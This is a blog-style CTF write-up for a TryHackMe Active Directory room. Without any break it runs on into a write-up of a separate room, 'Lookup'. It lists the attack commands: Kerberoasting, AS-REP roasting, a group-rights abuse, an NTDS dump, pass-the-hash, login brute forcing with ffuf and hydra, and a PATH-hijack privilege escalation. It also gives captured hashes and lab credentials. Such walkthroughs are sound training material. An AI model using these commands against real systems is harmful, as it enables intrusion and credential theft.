---
layout: post
title: Operation Endgames (TryHackMe)
date: 2026-04-08
categories: [CTF, TryHackme]
tags: [Targeted_Kerberosting, GenericWrite, writeowner, ntds_dump]
---


![opendgame](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/Operation-Endgame-img.png)

## Nmap Result

```bash
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus

80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE

88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-04-05 04:34:09Z)

135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC

139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn

443/tcp   open  ssl/https?    syn-ack ttl 126
|_ssl-date: 2026-04-05T04:36:21+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA/domainComponent=thm
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm

445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2026-04-05T04:36:21+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=ad.thm.local
| Issuer: commonName=ad.thm.local
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: AD
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: ad.thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-05T04:35:14+00:00
7680/tcp  open  pando-pub?    syn-ack ttl 126
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
47001/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49685/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49718/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49725/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
```

## SMB enumeration

- Checked for any shares but nothing seems intresting.
- So I have rid brute

```bash
nxc smb <IP> -u '' -p '' --rid-brute
```

- by running this we can get the users list and we can try ASEP-Kerbestoing

```bash
GetNPUsers.py thm.local/ -dc-ip 10.48.182.234 -usersfile Users.txt -no-pass
```

## Got some hashes

```
$krb5asrep$23$SHELLEY_BEARD@THM.LOCAL:1e44b0162c7c97ae23045820681b637f$a4cb23832f3dd8f2520c2a413bea312fc76cea9209aee77274770feea902afaa8435fe68eeee3292f97565946f2a76758a046e677e20b1f871b930b7736ecb8558dcb7e437d13287532b133b4c2bb4ec0bd79439ce515c919123b6f8c597a3970d77aee92e6ab4ab630feb8e3fd4973bed17e4fe1e3a9d0032f6e734e9cc00d4ccf56bcae0ae6e2a02ef8effda7a32cb12d914004718938b9c7ba3551f2424f830ed6472942beaa5fcc6e5b97090e0534188b42a0c1c61b44b70d1d9646c9b9f12e2dffb2d58534474e6f3f674fa86a0cbf2808b11cb755064dbf16ba8b4c90ce990503c13c6

$krb5asrep$23$ISIAH_WALKER@THM.LOCAL:e19e5ce2ba9722502ffb3843db447f22$6d8a5f0ae0fbad4e6fc89964b3ef8c226e22aa255dba59786223ecb76ef539d00737a4db230357c2d8d5f46f8236f137535dd227e7baf64f91d3c7985d9f3397fafa44a824bb4c763f566a8c2659ba51b200a4653300f348debcc7fb986f99537eaf6218443e72f3cd0bdfa50b5ab3d8fe5f62520c222a4c58ba731b7fe7988d06a138a2ab50d98cc2763a2e8621e5b96d1cf600b1c428e2f05eceb1f8af2c31721916699766647404fb126d5a5935053786d60a7266bbe5466249236ae07bc43b31ee4baee28efadc3065e4cd260c1b8e6e04dde2c87d01e89b155fb2fd9d0234cbef35f4a0

$krb5asrep$23$QUEEN_GARNER@THM.LOCAL:99d01d4aaaa21fb46201f0bdb895656e$95fce463bf180e7643559a82437af212561e053933f4345b9e7a91d079679e9574ef5af8733a3c1d4aa7d05b140b2ccb6184006b971226364581fe9544a66ff89cabdf70c4a52b0af3a7bc4316e42ba3dd097d1a08019b17f1cddbb69cf3bce0627d7a9ee723b792b91c19684627dcd79a16f043a6ae7cec3d454f6a8dd471876c4299476becbdec0ea777e491d907658dc37a86039c856c6235b48ce509a4e42874f53ac963d727e5417fffe17af6acdcc9ccc4cd9393489ccb5ca9a4ad268815d1a5539de1d9bad4c1188f79991716b03e2c5a346b8075ae5626a62561a3565259cbf2e3cb

$krb5asrep$23$PHYLLIS_MCCOY@THM.LOCAL:ed23cc81aadbb1162fe63823635a7608$959e1eedc9af6b01687b988c4d53a35aa293d606ef4b2a865ef386fe97c7dddc3dab8eff2568e1580fad2000b8f94e6567a5549fdee8841bda2d235bfaed0fdaf5d5c9d883d96497c8d9adeb25ddd3fc832b26980a241e01b1f781fa26e7dc64c54a909eb11ea53470feea8184b1df30be51fe799d979ee50ad3ef76545b40e3824e6d3c3cc055f9ad40015664824006d43728f478e003475e149b649633e1d4e89e013bd1f5a57c6ed0ac278cc154fd90eb5f5bda66fa3af833bead4791c5a7051cc24d7da6d25c274c74881504871839688d759152c927ad3565cb03ba4a5655f74bb328aa

$krb5asrep$23$MAXINE_FREEMAN@THM.LOCAL:4692a29239f877941cf3b036d2b2e035$a220a7d2405bc9d500c7781162e843c798fe63130fdb4d771dac7dd96eaede93f2a65857f762d8d884612e227301afbda3a2d89e94e17f4e89c21eb954c030ba3de7a8aca26b78d44417013408ca5d4845c6a99d13676045ea02d3a94e37a6b62a23b9664cce7739f33ad35f5ef42238960153551e7907e7458c959deb83062dea84ee397111baa39c1edd289f2e603e142c4d7d35488b30c3670672db5ed0ae3782b93f27921b8d7516fb5a087e738c158c40e49983fa603e16f3db1542ee66bac2ce60ce34686fb6728dcd3b21f85d3fb1858bb1c231f1b1d235478848054fadcf97503be5

```

- I tried hashing these but i can't

## Kerberosting

![[Pasted image 20260405105427.png]]
- Guest account is authenticated.
```
nxc ldap thm.local -u 'guest' -p '' --kerberoasting kerb.txt
```

- We can do kerberoasting with the guest user and got a hash

```
$krb5tgs$23$*CODY_ROY$THM.LOCAL$thm.local\CODY_ROY*$f76a19aaac17856b69718fa2dfbee421$ee7a9831221581c7867c8f18d49286b572c124e690ab6aa24c6f379e755ffbd527ba4abc5a6b56b69e2f08481b6c6d63a404a3960e39c1f29f5a45480bdb6912e82b50455e03efecb79acc6bfb36889e095bd43de0ad1ac243199100ae1a04886885888c91299872802173c192166bc8bd86f78bc5cae7b207c802bc27f369ed8500548ad30e3e3136fc3f6aec0f5aeb2e16bc4fb8eb9fc0dc7feb327dafc2e1f8e4127b60f017151aa23948c36e58e7ad794ee85d1edf3982ebf707affe62fed68c3e72083b1cf1e9440a906728507087668a0507078352b2aaaa43c020a4b31214282fa43618e211c65d17ab77024976eaca9c708c694d57c4434e209dbc851c1290290d57b8d0cad9fa043ae808d2b5fd8fa9b69f8b27b685b741aad2683c63da9499c7e42eb9d0b7fd1bd2f11093114db2669e078f1d8e364cadb21f659e9a4ccd7bd38180d9d537d3587121d28db9a1d59089538a74e88d090574373aa096d5a57cae875dfb6e29deb85409e483e20703ec8df5bf5b58a21d9177942494fc89d60121ab9e23eb423daca249f74f94dd512e602bc8f0f3ed5864e6707b260490ec3f38ff6927916a2bcb0968b0b422cfe7040ea01601c0ae7a91fa38736a8aa710a097b2b6e2511d267577b9a4f7ff90934cca5107dad003d3ec164c5293439f26323e78281f08cfd9eacc1969c0f837198d2369e8164ca4b89e4345bae5f6cee4824f3d42b664e02cd241bbaa3b21ce7d1a03034b62697d59e6c8feb897c2f0437ac064e11f2b1c738b0d42ab91189097ebe7df21374823ca959f43fa348cf2cd45cb3e697215bb471cb9b215f4d71843ba6ee6b34289ead1f83e8978bec7e404803780b58a9e3b00167506b9f175e76bedb40081a44f5a3ade7723eba30bd906f0d8e6c651fa24a231fe4236597376f7351a3451f5bb2724e398f51a0ab239a7723c5a2f632b04ccbb7f0aeb972762ea731455e4f632174326367052cc0a63165311221a6cc9847bca38f9e36449c3ead5ae8bbee03b1e7f719451518c795e530a62bce5059a4ef6cf491fa0a37565438c8b7bcf228b779ac907b2bd8cef3fac242e0ee9c3b97123b392c8d79236254c1281fa5102f9029f8efcf631b6163197379cc1282317abbd86d1007a4c8caf481bd34068e60bde0e722996fe18aa0d4db8ec27695f96b825fbe98c8843b7c95a46d4d7afee214605b18d17459721070dc92070a54e1445783d897d1efa58decf732386375dd1f76e336507c1e24cb26c8358357550debce6e3256cfdf3f3cda9c00bc17d63dd45f940995f9a4884e06c03f03aec8707a61656dad5a5bffeb872fe66931ed501992b41a15de31c6294ecde362de13776031b15638e4f199d6e026026bcdac5b6e3ed0afe9678
```

```
Cracked the hash
CODY_ROY:MKO)mko0
```

![[Pasted image 20260405110424.png]]

![[Pasted image 20260405143859.png]]
- Two users has same password.

![[Pasted image 20260405161618.png]]

- We have generic write over Jerri_lancaster so we can Target kerberoast.
- 
![[Pasted image 20260405162620.png]]

```
JERRI_LANCASTER:lovinlife!
```

![[Pasted image 20260405162746.png]]

![[Pasted image 20260405163640.png]]
- Have writeOwner access towards Reader Admins
## Adding the user to the group

```
net rpc group addmem "READER ADMINS" "JERRI_LANCASTER" -U "thm.local"/'JERRI_LANCASTER'%'lovinlife!' -S "10.49.138.51"
```

- Verifying

```
net rpc group members "READER ADMINS" -U "thm.local"/'JERRI_LANCASTER'%'lovinlife!' -S "10.49.138.51" 
THM\JERRI_LANCASTER
```

### We can RDP with JERRI creds

## Found Creds for SANFORD_DAUGHERTY domain admin

![[Pasted image 20260405164355.png]]
```
SANFORD_DAUGHERTY:RESET_ASAP123
```

## Dumping NTDS.dit

![[Pasted image 20260405165423.png]]

## Changed the password of the administrator and RDP as the user and got flag

```
nxc smb thm.local -u administrator -H "e599bf2fe56d6a21b3a5487bb4761d1b" -M change-password -o NEWPASS=Password@123
```

![[Pasted image 20260405170444.png]]

![[Pasted image 20260405170508.png]]


# Enumeration

## HTTP(80)

### Dirsearch


```bash
dirsearch -h http://lookup.thm

[14:33:07] 403 -  275B  - /.php                                             
[14:33:59] 200 -    1B  - /login.php                                        
[14:34:16] 403 -  275B  - /server-status                                    
[14:34:16] 403 -  275B  - /server-status/

```

## Website Features
- Login page

![Login](https://c00lrabbit.github.io/assets/Images/Lookup/Login-page.png)

- I tried injection attacks, Intercepted the traffic and Analyzed but no use.

#### Using ffuf we can try bruteforcing the login

```bash
ffuf -w /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt -X POST -u http://lookup.thm/login.php -d 'username=admin&password=FUZZ' -fw 8 
```
![ffuf password ](https://c00lrabbit.github.io/assets/Images/Lookup/ffuf-password.png)

But this password doesn't login so i enumerated the username

```bash
 ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-username.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=password123' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8 
```

![ffuf uname](https://c00lrabbit.github.io/assets/Images/Lookup/ffuf-uname.png)

- After we login with the correct credentials we get into `files.lookup.thm` vhost.
- There is a service running on this vhost named "elFinder".

![elfinder dashboard](https://c00lrabbit.github.io/assets/Images/Lookup/elfinder-hpage.png)

- Found the version of the elFinder

![elfinder version info](https://c00lrabbit.github.io/assets/Images/Lookup/elfinder-info.png)

# Exploitation

- This version is vulnerable to php command injection which leads to RCE.
- We found a Exploit from Exploit-DB https://www.exploit-db.com/exploits/46481

![exploit sshell](https://c00lrabbit.github.io/assets/Images/Lookup/exploit-shell.png)

We can upgrade this into interactive shell using Reverse shell.com
![rev-shell](https://c00lrabbit.github.io/assets/Images/Lookup/revshell-generator.png)

- After running linpeas we found a SUID
![linpeas-suid](https://c00lrabbit.github.io/assets/Images/Lookup/linpeas-SUID.png)

- Running pwm binary

![pwm-binary](https://c00lrabbit.github.io/assets/Images/Lookup/pwm-binary.png)

## Analysing the binary
- When we run this binary it executes `id` command and from the result it search for a .password file under the user.

```bash
cd /tmp
echo '#!/bin/bash' > id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id
chmod +x id
export PATH=/tmp:$PATH
/usr/sbin/pwm
```
### Breakdown of the above commands
- We are redirecting to `/tmp` because `/tmp` directory have mostly read and write access.
- Creating a shell script named 'id' we are echoing the commands into the file 'id'.
-  Adding Execution privilege to the script and exporting `/tmp` dir to PATH, Here comes the intresting part in linux when we are running a command or file it first check the location of the file form the PATHS list so here we are adding the `/tmp` which makes the `/usr/sbin/pwm` script to run our malicious 'id' script.
- Our script will output like the think user and we can read the /home/think/.passwords file Because the pwm script thinks we are 'think' user.

- After running the above line we get this password list

```
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
....

```

- Using hydra we can bruteforce the login

```bash
hydra -l think -P password.txt ssh://lookup.thm -t 40 -v
```
![hydra-out](https://c00lrabbit.github.io/assets/Images/Lookup/hydra-out.png)

# Privilege Escalation

- Using the found credentials we can ssh into the machine.
```
ssh think@lookup.thm
```

- After running `sudo -l` we found that we have access to "look" with sudo.
- After search in GTFO bins [Click Here](https://gtfobins.github.io/gtfobins/look/#sudo) we found a bypass.

![GTFO-Bins](https://c00lrabbit.github.io/assets/Images/Lookup/gtfo-bin.png)

- We got the root

![root](https://c00lrabbit.github.io/assets/Images/Lookup/Root.png)


## Conclusion
- Bypassing the login page is bit tricky and getting the password list you have to think outside the box.
- Privilege escalation is Stright forward.
- Overall it is a good machine to Test you bruteforcing skills and Enumeration skills.

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/O4O31I0TAI)